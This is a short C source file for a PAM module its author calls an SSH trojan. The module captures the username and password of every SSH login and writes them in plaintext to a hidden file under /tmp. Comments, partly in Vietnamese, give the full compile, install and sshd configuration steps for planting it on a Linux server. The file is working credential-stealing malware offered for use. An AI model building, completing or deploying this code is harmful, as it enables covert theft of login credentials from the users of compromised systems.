#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>

#define LOG_FILE "/tmp/.log_sshtrojan1.txt"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *pass;

    pam_get_item(pamh, PAM_USER, (const void **)&user);

    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&pass);

    FILE *log_file = fopen(LOG_FILE, "a");
    if (log_file != NULL) {
        fprintf(log_file, "Username: %s, Password: %s\n", user, pass);
        fclose(log_file);
    }

    return PAM_SUCCESS; 
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

// gcc -fPIC -c sshtrojan1.c -o pam_sshtrojan1.o
// ld -x --shared -o pam_sshtrojan1.so pam_sshtrojan1.o
// mv pam_sshtrojan1.so /lib/x86_64-linux-gnu/security 
// sau khi move fake module vào lib chứa các module liên quan đến Pluggable Authentication Modules (PAM) trên các hệ thống Linux 64-bit -> cấu hình PAM sshd 
// thêm auth  required  pam_sshtrojan1.so vào cuối file /etc/pam.d/sshd -> restart service -> login ssh and check log
